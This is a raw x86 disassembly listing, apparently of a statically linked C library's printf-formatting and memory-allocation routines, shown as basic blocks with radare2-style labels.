mov ebx, eax
mov eax, dword [var_468h]
sub ebx, esi
and eax, 7
sub ebx, eax
jmp 0x8066484
mov edi, dword [var_500h]
mov dword [esp], esi
mov dword [var_4h], edi
call fcn.08076f30
mov ebx, eax
jmp 0x8066486
mov eax, dword [0x80a9ab4]
jmp 0x80663fd
mov dword [esp], esi
call fcn.08053400
jmp 0x8066590
mov ebx, dword [var_500h]
mov dword [var_478h], esi
mov dword [var_474h], 0
lea edi, [var_474h]
mov dword [var_470h], 0
test ebx, ebx
js 0x8066660
cmp dword [var_500h], 0x1000
ja 0x806662a
mov eax, dword [var_500h]
add eax, 0x12
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_23h_2]
and esi, 0xfffffff0
mov dword [esp + 0xc], edi
lea eax, [var_478h]
mov edx, dword [var_500h]
mov dword [var_4h], eax
mov dword [esp], esi
mov dword [var_8h], edx
call fcn.08077e00
mov ebx, eax
cmp ebx, 0xffffffff
jne 0x8066486
jmp 0x8064cc0
mov esi, dword [var_500h]
mov dword [esp], esi
call fcn.0807adb0
test eax, eax
jne 0x80665e5
mov eax, dword [var_500h]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x8064cc0
mov dword [var_50ch], 1
jmp 0x80665fa
lea ecx, [var_478h]
mov dword [esp + 0xc], edi
mov dword [var_8h], 0
mov dword [var_4h], ecx
mov dword [esp], 0
call fcn.08077e00
cmp eax, 0xffffffff
mov ebx, eax
je 0x8064cc0
mov ecx, dword [var_474h]
test ecx, ecx
jne 0x8066712
mov dword [var_478h], esi
lea esi, [eax + 1]
cmp esi, 0x1000
mov dword [var_510h], esi
ja 0x80666e2
lea eax, [ebx + 0x13]
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_23h_2]
and esi, 0xfffffff0
mov dword [esp + 0xc], edi
lea ecx, [var_478h]
mov edx, dword [var_510h]
mov dword [var_4h], ecx
mov dword [esp], esi
mov dword [var_8h], edx
call fcn.08077e00
jmp 0x806661c
mov dword [esp], esi
call fcn.0807adb0
test eax, eax
jne 0x80666ae
mov eax, dword [var_510h]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x8064cc0
mov dword [var_50ch], 1
jmp 0x80666bd
mov dword [esp + 0xc], 0x80a0a06
mov dword [var_8h], 0x5ed
jmp 0x806535a
cmp dword [var_500h], 0xffffffff
je 0x8066739
cmp dword [var_500h], 5
jle 0x8066748
mov esi, 0x80a0a40
mov ebx, 6
jmp 0x8066486
mov esi, 0x80a4f11
xor ebx, ebx
jmp 0x8066486
mov eax, dword [var_4ech]
test eax, eax
jne 0x80667b6
mov edi, dword [var_4f8h]
test edi, edi
jne 0x806679f
mov esi, dword [var_4f0h]
test esi, esi
je 0x8066789
mov eax, dword [arg_10h]
mov ecx, dword [var_4b0h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov word [eax], cx
jmp 0x80661b6
mov eax, dword [arg_10h]
mov ecx, dword [var_4b0h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov dword [eax], ecx
jmp 0x80661b6
mov eax, dword [arg_10h]
movzx edx, byte [var_4b0h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov byte [eax], dl
jmp 0x80661b6
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov ecx, dword [eax]
mov eax, dword [var_4b0h]
cdq
mov dword [ecx], eax
mov dword [ecx + 4], edx
jmp 0x80661b6
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
test eax, eax
je 0x8066d42
mov edi, 0x10
xor ebx, ebx
mov dword [var_4d4h], eax
mov dword [var_4d8h], 1
mov dword [var_4e8h], 0
mov byte [var_506h], 0x78
cmp dword [var_500h], 0
jl 0x8066d33
mov byte [var_505h], 0x20
jne 0x8066ca0
mov edx, dword [var_4d4h]
test edx, edx
jne 0x8066ca0
cmp edi, 8
mov esi, dword [var_4bch]
je 0x8066c82
mov eax, dword [var_4bch]
sub eax, esi
cmp dword [var_500h], eax
jg 0x8066870
mov eax, dword [var_4d4h]
test eax, eax
je 0x8066870
mov eax, dword [var_4d8h]
test eax, eax
je 0x8066870
cmp edi, 8
je 0x8066c79
lea esi, [esi]
mov edx, dword [var_4bch]
mov eax, 0
mov ecx, dword [var_4e0h]
sub edx, esi
sub dword [var_500h], edx
cmovns eax, dword [var_500h]
test ecx, ecx
mov dword [var_500h], eax
jne 0x8066abf
lea eax, [eax + edx]
sub dword [var_4fch], eax
mov eax, dword [var_4d4h]
test eax, eax
je 0x80668d4
mov ecx, dword [var_4d8h]
test ecx, ecx
je 0x80668d4
mov eax, dword [var_4fch]
sub eax, 2
cmp edi, 0x10
cmovne eax, dword [var_4fch]
mov dword [var_4fch], eax
test ebx, ebx
jne 0x80668ec
mov edx, dword [var_4e4h]
test edx, edx
jne 0x80668ec
mov eax, dword [var_4dch]
test eax, eax
je 0x80668f2
dec dword [var_4fch]
cmp byte [var_505h], 0x20
je 0x8066a83
test ebx, ebx
je 0x8066a31
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8066a15
mov byte [eax], 0x2d
mov ecx, dword [arg_8h]
inc dword [ecx + 0x14]
inc dword [var_4b0h]
mov eax, dword [var_4d4h]
test eax, eax
je 0x806693e
mov eax, dword [var_4d8h]
test eax, eax
je 0x806693e
cmp edi, 0x10
je 0x80669a3
mov eax, dword [var_500h]
add dword [var_4fch], eax
mov ebx, dword [var_4fch]
test ebx, ebx
jle 0x8066977
mov edx, dword [var_4fch]
mov dword [var_4h], 0x30
mov dword [var_8h], edx
mov ecx, dword [arg_8h]
mov dword [esp], ecx
call fcn.08075680
add dword [var_4b0h], eax
mov edi, dword [arg_8h]
mov ebx, dword [var_4bch]
mov eax, dword [edi + 0x94]
sub ebx, esi
mov dword [esp], edi
mov dword [var_8h], ebx
mov dword [var_4h], esi
call dword [eax + 0x1c]
cmp eax, ebx
je 0x80661b0
jmp 0x8064cc0
mov edi, dword [arg_8h]
mov eax, dword [edi + 0x14]
cmp eax, dword [edi + 0x18]
jae 0x80669fd
mov byte [eax], 0x30
mov eax, dword [arg_8h]
inc dword [eax + 0x14]
mov ecx, dword [arg_8h]
inc dword [var_4b0h]
movsx eax, byte [var_506h]
mov edx, dword [ecx + 0x14]
cmp edx, dword [ecx + 0x18]
jae 0x80669ec
mov byte [edx], al
mov edi, dword [ebp + 8]
movzx eax, al
inc dword [edi + 0x14]
inc eax
je 0x8064cc0
inc dword [ebp - 0x4b0]
jmp 0x806693e
movzx eax, al
mov dword [esp], ecx
mov dword [esp + 4], eax
call fcn.0804d840
jmp 0x80669da
mov dword [var_4h], 0x30
mov dword [esp], edi
call fcn.0804d840
inc eax
jne 0x80669b7
jmp 0x8064cc0
mov dword [var_4h], 0x2d
mov dword [esp], edx
call fcn.0804d840
inc eax
jne 0x806691f
jmp 0x8064cc0
mov eax, dword [var_4e4h]
test eax, eax
je 0x8066a58
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8066a4e
mov byte [eax], 0x2b
jmp 0x8066919
mov dword [var_4h], 0x2b
jmp 0x8066a1d
mov eax, dword [var_4dch]
test eax, eax
je 0x8066925
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8066a79
mov byte [eax], 0x20
jmp 0x8066919
mov dword [var_4h], 0x20
jmp 0x8066a1d
mov eax, dword [var_4fch]
test eax, eax
jle 0x8066ab0
mov ecx, dword [var_4fch]
mov dword [var_4h], 0x20
mov dword [var_8h], ecx
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08075680
add dword [var_4b0h], eax
mov dword [var_4fch], 0
jmp 0x80668ff
test ebx, ebx
je 0x8066c27
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8066c0b
mov byte [eax], 0x2d
mov ecx, dword [arg_8h]
inc dword [ecx + 0x14]
inc dword [var_4b0h]
dec dword [var_4fch]
mov eax, dword [var_4d4h]
test eax, eax
je 0x8066b08
mov eax, dword [var_4d8h]
test eax, eax
je 0x8066b08
cmp edi, 0x10
je 0x8066b92
mov ebx, dword [var_4bch]
mov edx, dword [var_500h]
sub ebx, esi
lea eax, [edx + ebx]
sub dword [var_4fch], eax
test edx, edx
jle 0x8066b40
mov dword [var_8h], edx
mov dword [var_4h], 0x30
mov ecx, dword [arg_8h]
mov dword [esp], ecx
call fcn.08075680
add dword [var_4b0h], eax
mov edi, dword [arg_8h]
mov eax, dword [edi + 0x94]
mov dword [esp], edi
mov dword [var_4h], esi
mov dword [var_8h], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x8064cc0
add dword [var_4b0h], eax
mov eax, dword [var_4fch]
test eax, eax
jle 0x80661b6
mov eax, dword [var_4fch]
mov dword [esp], edi
mov dword [var_4h], 0x20
mov dword [var_8h], eax
call fcn.08075680
jmp 0x80661b0
mov edi, dword [arg_8h]
mov eax, dword [edi + 0x14]
cmp eax, dword [edi + 0x18]
jae 0x8066bf3
mov byte [eax], 0x30
mov eax, dword [arg_8h]
inc dword [eax + 0x14]
mov ecx, dword [arg_8h]
inc dword [var_4b0h]
movsx eax, byte [var_506h]
mov edx, dword [ecx + 0x14]
cmp edx, dword [ecx + 0x18]
jae 0x8066be2
mov byte [edx], al
mov edi, dword [arg_8h]
movzx eax, al
inc dword [edi + 0x14]
inc eax
je 0x8064cc0
inc dword [var_4b0h]
sub dword [var_4fch], 2
jmp 0x8066b08
movzx eax, al
mov dword [esp], ecx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x8066bc9
mov dword [var_4h], 0x30
mov dword [esp], edi
call fcn.0804d840
inc eax
jne 0x8066ba6
jmp 0x8064cc0
mov dword [var_4h], 0x2d
mov dword [esp], edx
call fcn.0804d840
inc eax
jne 0x8066adf
jmp 0x8064cc0
mov ecx, dword [var_4e4h]
test ecx, ecx
je 0x8066c4e
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8066c44
mov byte [eax], 0x2b
jmp 0x8066ad9
mov dword [var_4h], 0x2b
jmp 0x8066c13
mov edx, dword [var_4dch]
test edx, edx
je 0x8066aeb
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8066c6f
mov byte [eax], 0x20
jmp 0x8066ad9
mov dword [var_4h], 0x20
jmp 0x8066c13
dec esi
mov byte [esi], 0x30
jmp 0x8066870
mov eax, dword [var_4d8h]
test eax, eax
je 0x8066840
mov edx, dword [var_4bch]
dec esi
mov byte [edx - 1], 0x30
jmp 0x8066840
xor eax, eax
cmp byte [var_506h], 0x58
mov dword [var_8h], edi
sete al
mov dword [esp + 0xc], eax
mov ecx, dword [var_4bch]
mov dword [var_4h], ecx
mov esi, dword [var_4d4h]
mov dword [esp], esi
call fcn.08063c00
mov esi, eax
mov eax, dword [var_4e8h]
test eax, eax
je 0x8066d03
mov eax, dword [var_4ach]
test eax, eax
je 0x8066d03
mov eax, dword [var_4a8h]
mov dword [esp], eax
mov eax, esi
mov edx, dword [var_4bch]
mov ecx, dword [var_4ach]
call fcn.08067960
sub esp, 4
mov esi, eax
mov eax, dword [var_504h]
test eax, eax
je 0x8066840
cmp edi, 0xa
jne 0x8066840
mov edx, dword [var_4bch]
mov dword [esp], esi
mov dword [var_4h], edx
call fcn.08063f40
mov esi, eax
jmp 0x8066840
mov dword [var_500h], 1
jmp 0x8066ca0
cmp dword [var_500h], 4
mov eax, 5
mov esi, 0x80a0a39
cmovg eax, dword [var_500h]
mov dword [var_500h], eax
jmp 0x80663a0
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov esi, dword [eax]
jmp 0x80663aa
mov ebx, dword [var_4f4h]
test ebx, ebx
jne case.0x80671e9.57
mov ecx, dword [var_4e0h]
dec dword [var_4fch]
test ecx, ecx
jne 0x8066dbe
mov edx, dword [var_4fch]
test edx, edx
jle 0x8066dbe
mov edi, dword [var_4fch]
mov dword [var_4h], 0x20
mov dword [var_8h], edi
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08075680
add dword [var_4b0h], eax
mov ecx, dword [arg_8h]
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov edx, dword [ecx + 0x14]
movzx eax, byte [eax]
cmp edx, dword [ecx + 0x18]
jae 0x8066e21
mov byte [edx], al
mov esi, dword [arg_8h]
inc dword [esi + 0x14]
inc eax
je 0x8064cc0
mov eax, dword [var_4e0h]
inc dword [var_4b0h]
test eax, eax
je 0x80661b6
mov eax, dword [var_4fch]
test eax, eax
jle 0x80661b6
mov edi, dword [var_4fch]
mov dword [var_4h], 0x20
mov dword [var_8h], edi
mov eax, dword [arg_8h]
mov dword [esp], eax
jmp 0x8066b88
movzx eax, al
mov dword [esp], ecx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x8066ddb
lea ebx, [var_43ch]
xor eax, eax
mov ecx, 5
cld
mov edi, ebx
mov edx, dword [var_500h]
rep stosd dword es:[edi], eax
movsx eax, byte [var_506h]
mov ecx, dword [var_4fch]
mov dword [var_43ch], edx
movzx edx, byte [var_4f0h]
mov dword [var_438h], ecx
movzx ecx, byte [var_4f4h]
mov dword [var_434h], eax
add edx, edx
shl ecx, 2
movzx eax, byte [var_430h]
and eax, 0xfffffffc
or eax, dword [var_4ech]
or eax, edx
movzx edx, byte [var_4d8h]
and eax, 0xfffffff3
or eax, ecx
movzx ecx, byte [var_4dch]
shl edx, 3
or eax, edx
movzx edx, byte [var_4e0h]
shl ecx, 4
and eax, 0xffffffcf
or eax, ecx
movzx ecx, byte [var_4e4h]
shl edx, 5
or eax, edx
movzx edx, byte [var_4e8h]
shl ecx, 6
and eax, 0x3f
or eax, ecx
shl edx, 7
or eax, edx
movzx edx, byte [var_504h]
mov byte [var_430h], al
movzx eax, byte [var_42fh]
shl edx, 3
and eax, 0xfffffff7
or eax, edx
mov byte [var_42fh], al
movzx eax, byte [var_505h]
mov dword [var_42ch], eax
mov eax, dword [var_4ech]
test eax, eax
je 0x8066f59
mov eax, dword [arg_10h]
add dword [arg_10h], 0xc
mov ecx, dword [eax + 8]
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [var_418h], edx
mov dword [var_414h], ecx
mov dword [var_41ch], eax
lea eax, [var_41ch]
mov dword [var_454h], eax
mov dword [var_4h], ebx
lea eax, [var_454h]
mov dword [var_8h], eax
mov esi, dword [arg_8h]
mov dword [esp], esi
call fcn.08067f60
jmp 0x80661a1
mov eax, dword [arg_10h]
add dword [arg_10h], 8
fld qword [eax]
fstp qword [ebp - 0x41c]
jmp 0x8066f2f
mov edi, 0x10
mov eax, dword [var_4ech]
xor ebx, ebx
mov dword [var_4e4h], 0
mov dword [var_4dch], 0
test eax, eax
je 0x80670b8
mov eax, dword [arg_10h]
add dword [arg_10h], 8
mov edx, dword [eax]
mov ecx, dword [eax + 4]
mov dword [var_4d4h], edx
mov dword [var_4d0h], ecx
cmp dword [var_500h], 0
jl 0x80670a9
mov byte [var_505h], 0x20
jne 0x806700e
mov ecx, dword [var_4d0h]
or ecx, dword [var_4d4h]
jne 0x806700e
cmp edi, 8
mov esi, dword [var_4bch]
je 0x8066ff7
mov eax, dword [var_4d4h]
or eax, dword [var_4d0h]
setne al
movzx eax, al
mov dword [var_4d4h], eax
jmp 0x8066840
mov eax, dword [var_4d8h]
test eax, eax
je 0x8066fda
mov eax, dword [var_4bch]
dec esi
mov byte [eax - 1], 0x30
jmp 0x8066fda
xor eax, eax
cmp byte [var_506h], 0x58
mov dword [esp + 0xc], edi
sete al
mov dword [var_10h_2], eax
mov edx, dword [var_4bch]
mov dword [var_8h], edx
mov edx, dword [var_4d0h]
mov eax, dword [var_4d4h]
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.08063ca0
mov ecx, dword [var_4e8h]
mov esi, eax
test ecx, ecx
je 0x8067079
mov edx, dword [var_4ach]
test edx, edx
je 0x8067079
mov edx, dword [var_4a8h]
mov dword [esp], edx
mov edx, dword [var_4bch]
mov ecx, dword [var_4ach]
call fcn.08067960
sub esp, 4
mov esi, eax
mov eax, dword [var_504h]
test eax, eax
je 0x8066fda
cmp edi, 0xa
jne 0x8066fda
mov ecx, dword [var_4bch]
mov dword [esp], esi
mov dword [var_4h], ecx
call fcn.08063f40
mov esi, eax
jmp 0x8066fda
mov dword [var_500h], 1
jmp 0x806700e
mov esi, dword [var_4f8h]
test esi, esi
je 0x80670d7
mov eax, dword [arg_10h]
add dword [arg_10h], 4
movzx eax, byte [eax]
mov dword [var_4d4h], eax
jmp 0x8066809
mov ecx, dword [var_4f0h]
test ecx, ecx
jne 0x80670ec
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
jmp 0x80670cc
mov eax, dword [arg_10h]
add dword [arg_10h], 4
movzx eax, word [eax]
jmp 0x80670cc
mov edi, 8
jmp 0x8066f6f
mov edi, 0xa
jmp 0x8066f6f
mov eax, dword [var_4ech]
mov edi, 0xa
test eax, eax
je 0x8067146
mov eax, dword [arg_10h]
add dword [arg_10h], 8
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov ebx, edx
shr ebx, 0x1f
je 0x8067135
neg eax
adc edx, 0
neg edx
mov dword [var_4d4h], eax
mov dword [var_4d0h], edx
jmp 0x8066fab
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov edx, eax
mov ebx, eax
neg edx
shr ebx, 0x1f
cmovne eax, edx
jmp 0x80670cc
mov esi, dword [arg_8h]
mov eax, dword [esi + 0x14]
cmp eax, dword [esi + 0x18]
jae 0x806717f
mov byte [eax], 0x25
mov edi, dword [arg_8h]
inc dword [edi + 0x14]
inc dword [var_4b0h]
jmp 0x80661b6
mov dword [var_4h], 0x25
mov dword [esp], esi
call fcn.0804d840
inc eax
jne 0x8067174
jmp 0x8064cc0
mov dword [var_4ech], 1
mov dword [var_4f4h], 1
mov eax, dword [var_44ch]
lea edx, [eax + 1]
mov dword [var_44ch], edx
mov edx, case.0x80643c0.32
movzx eax, byte [eax + 1]
mov byte [var_506h], al
sub eax, 0x20
cmp al, 0x5a
ja case.default.0x80648b6
movsx eax, byte [var_506h]
mov eax, dword [eax*4 + 0x80a09e0]
mov edx, dword [eax*4 + 0x80a0e60]
jmp edx
mov dword [var_4f0h], 0
mov dword [var_4f8h], 1
jmp 0x80671ab
mov dword [var_4ech], 0
mov dword [var_4f4h], 0
jmp 0x80671ab
jmp case.0x8067365.59
mov eax, dword [var_44ch]
mov dword [var_4f4h], 1
lea edx, [eax + 1]
mov dword [var_44ch], edx
mov edx, case.0x80643c0.32
movzx eax, byte [eax + 1]
mov byte [var_506h], al
sub eax, 0x20
cmp al, 0x5a
ja case.default.0x80648b6
movsx eax, byte [var_506h]
mov eax, dword [eax*4 + 0x80a09e0]
mov edx, dword [eax*4 + 0x80a0de0]
jmp edx
mov eax, dword [var_44ch]
mov dword [var_4f0h], 1
lea edx, [eax + 1]
mov dword [var_44ch], edx
mov edx, case.0x80643c0.32
movzx eax, byte [eax + 1]
mov byte [var_506h], al
sub eax, 0x20
cmp al, 0x5a
ja case.default.0x80648b6
movsx eax, byte [var_506h]
mov eax, dword [eax*4 + 0x80a09e0]
mov edx, dword [eax*4 + 0x80a0d60]
jmp edx
mov ecx, dword [var_44ch]
lea edx, [ecx + 1]
mov dword [var_44ch], edx
movzx eax, byte [ecx + 1]
cmp al, 0x2a
je 0x8067462
movzx eax, al
mov dword [var_500h], 0
sub eax, 0x30
cmp eax, 9
jbe 0x8067449
mov eax, dword [var_4fch]
cmp dword [var_500h], eax
jle 0x8067331
mov ebx, dword [var_500h]
add ebx, 0x20
cmp ebx, 0x3e8
jle 0x8067331
cmp ebx, 0x1000
ja 0x806740e
mov eax, dword [var_500h]
mov edx, dword [var_500h]
add eax, 0x32
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_23h_2]
and eax, 0xfffffff0
lea eax, [edx + eax + 0x20]
mov dword [var_4bch], eax
mov eax, dword [var_44ch]
mov edx, case.0x80643c0.32
movzx eax, byte [eax]
mov byte [var_506h], al
sub eax, 0x20
cmp al, 0x5a
ja case.default.0x80648b6
movsx eax, byte [var_506h]
mov eax, dword [eax*4 + 0x80a09e0]
mov edx, dword [eax*4 + 0x80a0ce0]
jmp edx
mov dword [var_504h], 1
jmp 0x80643d0
lea eax, [var_44ch]
mov dword [esp], eax
call fcn.08064110
mov ebx, eax
mov dword [var_4fch], eax
add ebx, 0x20
cmp ebx, 0x3e7
jle 0x80673c4
cmp ebx, 0x1000
ja 0x80673da
mov eax, dword [var_4fch]
mov esi, dword [var_4fch]
add eax, 0x32
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_23h_2]
and eax, 0xfffffff0
lea eax, [esi + eax + 0x20]
mov dword [var_4bch], eax
mov eax, dword [var_44ch]
movzx eax, byte [eax]
cmp al, 0x24
jne 0x8064547
jmp 0x80648c5
mov dword [esp], ebx
call fcn.0807adb0
test eax, eax
jne 0x806739f
mov dword [esp], ebx
call fcn.08050fe0
test eax, eax
mov dword [var_4b8h], eax
je 0x8064cc0
mov edi, dword [var_4fch]
lea edi, [edi + eax + 0x20]
mov dword [var_4bch], edi
jmp 0x80673c4
mov dword [esp], ebx
call fcn.0807adb0
test eax, eax
jne 0x806730c
mov dword [esp], ebx
call fcn.08050fe0
test eax, eax
mov dword [var_4b8h], eax
je 0x8064cc0
mov ecx, dword [var_500h]
lea ecx, [ecx + eax + 0x20]
mov dword [var_4bch], ecx
jmp 0x8067331
lea eax, [var_44ch]
mov dword [esp], eax
call fcn.08064110
mov dword [var_500h], eax
jmp 0x80672e1
lea edx, [ecx + 2]
mov dword [var_44ch], edx
mov dword [var_450h], edx
movzx eax, byte [ecx + 2]
sub eax, 0x30
cmp eax, 9
jbe 0x80674a3
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
test eax, eax
mov dword [var_500h], eax
jns 0x80672e1
mov dword [var_500h], 0xffffffff
jmp 0x80672e1
lea eax, [var_450h]
mov dword [esp], eax
call fcn.08064110
test eax, eax
je 0x806747d
mov eax, dword [var_450h]
cmp byte [eax], 0x24
jne 0x806747d
jmp 0x80648c5
mov dword [esp], eax
call fcn.0807adb0
test eax, eax
jne 0x806484d
mov eax, dword [var_568h]
cmp dword [var_564h], eax
cmovge eax, dword [var_564h]
add eax, 0x20
mov dword [esp], eax
call fcn.08050fe0
mov edx, dword [var_568h]
cmp dword [var_564h], edx
mov dword [var_574h], eax
mov ecx, dword [var_574h]
mov eax, edx
cmovge eax, dword [var_564h]
lea eax, [eax + ecx + 0x20]
mov dword [var_4bch], eax
jmp 0x806488a
mov dword [esi + edx], 0xffffffff
jmp 0x8064802
neg eax
or ebx, 0x20
mov byte [esi + ecx + 0xc], bl
mov dword [esi + ecx + 4], eax
mov dword [var_548h], 1
jmp 0x80647c0
mov esi, dword [var_574h]
mov dword [esp], esi
call fcn.08051180
jmp 0x806462e
mov dword [esp], ebx
call fcn.0807adb0
test eax, eax
jne 0x8064519
mov dword [esp], ebx
call fcn.08050fe0
test eax, eax
mov dword [var_4b8h], eax
je 0x8064cc0
mov ecx, dword [var_4fch]
lea ecx, [ecx + eax + 0x20]
mov dword [var_4bch], ecx
jmp 0x806453e
neg eax
mov byte [var_505h], 0x20
mov dword [var_4e0h], 1
mov dword [var_4fch], eax
jmp 0x80644fc
lea eax, [var_448h]
mov dword [esp], eax
call fcn.08064110
test eax, eax
je 0x80644e5
mov eax, dword [var_448h]
cmp byte [eax], 0x24
jne 0x80644e5
jmp 0x80648c5
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08074540
jmp 0x8064279
mov ecx, 0xffffffff
mov dword [eax], 0x16
jmp 0x80641ce
mov dword [eax], 9
jmp 0x80641ce
push ebp
mov ebp, esp
sub esp, 0xc
mov eax, dword [arg_ch]
mov dword [var_8h], 1
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0804a1a0
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x18
mov esi, dword [arg_10h]
mov edi, dword [arg_ch]
mov eax, dword [arg_8h]
mov dword [var_10h], eax
mov dword [esp], 0x16c
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x804a246
lea eax, [eax + 0x98]
mov dword [ebx + 0x48], eax
mov dword [esp], ebx
mov dword [var_4h], 0
lea eax, [ebx + 0xb0]
mov dword [var_sp_10h], 0x80929a0
mov dword [var_8h], 0
mov dword [var_ch], eax
call fcn.0804e030
mov dword [ebx + 0x94], 0x8092b00
mov dword [esp], ebx
call fcn.0804b5e0
mov dword [var_ch], esi
mov dword [var_8h], edi
mov eax, dword [var_10h]
mov dword [esp], ebx
mov dword [var_4h], eax
call fcn.0804b940
test eax, eax
je 0x804a236
mov dword [arg_8h], ebx
add esp, 0x18
pop ebx
pop esi
pop edi
leave
jmp 0x804a160
mov dword [esp], ebx
call fcn.0804d500
mov dword [esp], ebx
call fcn.08051180
add esp, 0x18
xor eax, eax
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
sub esp, 0xc
mov eax, dword [arg_ch]
mov dword [var_8h], 1
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0804a1a0
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0xb8
mov dword [var_4h], ebx
invalid
inc esp
and al, 0x10
push ebp
mov ebp, esp
sub esp, 0x14
mov edx, dword [0x80a950c]
mov dword [var_4h], edi
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov edi, dword [arg_8h]
test edx, edx
je 0x8051013
mov eax, dword [arg_4h]
mov dword [esp], edi
mov dword [var_sp_4h], eax
call edx
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov eax, 0
test eax, eax
je 0x805116e
mov dword [esp], 0
call section.
mov esi, eax
test esi, esi
mov ebx, esi
je 0x805114d
mov eax, 0
test eax, eax
je 0x805115d
mov dword [esp], esi
call section.
test eax, eax
jne 0x805114d
xor eax, eax
test ebx, ebx
je 0x8051008
mov dword [var_sp_4h], edi
mov dword [esp], ebx
call fcn.08051cf0
test eax, eax
mov esi, eax
je 0x805108a
mov eax, 0
test eax, eax
je 0x8051082
mov dword [esp], ebx
call section.
mov eax, esi
jmp 0x8051008
mov dword [ebx], 0
jmp 0x805107e
cmp ebx, 0x80aa360
je 0x80510fc
mov eax, 0
test eax, eax
je 0x80510f4
mov dword [esp], ebx
call section.
mov eax, 0
test eax, eax
je 0x80510e8
mov dword [esp], 0x80aa360
call section.
mov dword [var_sp_4h], edi
mov dword [esp], 0x80aa360
call fcn.08051cf0
mov esi, eax
mov eax, 0
test eax, eax
je 0x80510dc
mov dword [esp], 0x80aa360
jmp 0x8051079
mov dword [0x80aa360], 0
jmp 0x805107e
mov dword [0x80aa360], 1
jmp 0x80510b8
mov dword [ebx], 0
jmp 0x80510a3
mov eax, dword [0x80aa7cc]
mov edx, edi
test eax, eax
mov eax, esi
cmovne eax, ebx
call fcn.0804f920
mov ebx, eax
mov eax, 0
test eax, eax
je 0x8051141
mov dword [esp], 0x80aa360
call section.
test ebx, ebx
je 0x805107e
mov dword [var_sp_4h], edi
mov dword [esp], ebx
call fcn.08051cf0
mov esi, eax
jmp 0x805106d
mov dword [0x80aa360], 0
jmp 0x8051126
mov edx, edi
mov eax, esi
call fcn.0804f920
mov ebx, eax
jmp 0x8051055
mov eax, dword [esi]
test eax, eax
jne 0x805114d
mov dword [esi], 1
jmp 0x8051055
mov esi, dword [0x80aa34c]
jmp 0x805102e
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x24
mov eax, dword [arg_8h]
mov dword [var_10h], eax
mov eax, dword [arg_ch]
cmp eax, 0xffffffdf
ja 0x8052208
add eax, 0xb
mov dword [var_14h], 0x10
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
cmovb edx, dword [var_14h]
mov dword [var_14h], edx
mov edx, dword [var_10h]
mov ecx, dword [edx + 0x28]
cmp dword [var_14h], ecx
ja 0x8051d55
mov eax, dword [var_14h]
shr eax, 1
add edx, eax
mov eax, dword [edx + 0x24]
test eax, eax
mov dword [var_1ch], eax
je 0x8051d55
mov ecx, eax
mov eax, dword [eax + 8]
mov dword [edx + 0x24], eax
mov eax, ecx
add eax, 8
add esp, 0x24
pop ebx
pop esi
pop edi
leave
ret
cmp dword [var_14h], 0x1ff
ja 0x8052197
mov eax, dword [var_14h]
mov edx, dword [var_10h]
shr eax, 3
lea ebx, [edx + eax*8 + 0x54]
mov dword [var_18h], eax
mov ecx, dword [ebx + 0xc]
cmp ecx, ebx
mov dword [var_1ch], ecx
je 0x8051db1
test ecx, ecx
je 0x8051da9
mov edx, dword [var_1ch]
mov ecx, dword [var_14h]
mov eax, dword [var_1ch]
or dword [ecx + edx + 4], 1
mov eax, dword [eax + 0xc]
mov dword [ebx + 0xc], eax
mov dword [eax + 8], ebx
cmp dword [var_10h], 0x80aa360
je 0x8051da4
or dword [edx + 4], 4
mov eax, dword [var_1ch]
jmp 0x8051d4a
mov dword [esp], edx
call fcn.08052430
mov edx, dword [var_10h]
mov ecx, dword [var_14h]
add edx, 0x5c
or ecx, 1
mov dword [var_24h], edx
mov dword [var_20h], ecx
mov eax, dword [var_10h]
mov edx, dword [var_24h]
mov eax, dword [eax + 0x68]
cmp eax, edx
mov dword [var_1ch], eax
je 0x8051e71
mov eax, dword [var_1ch]
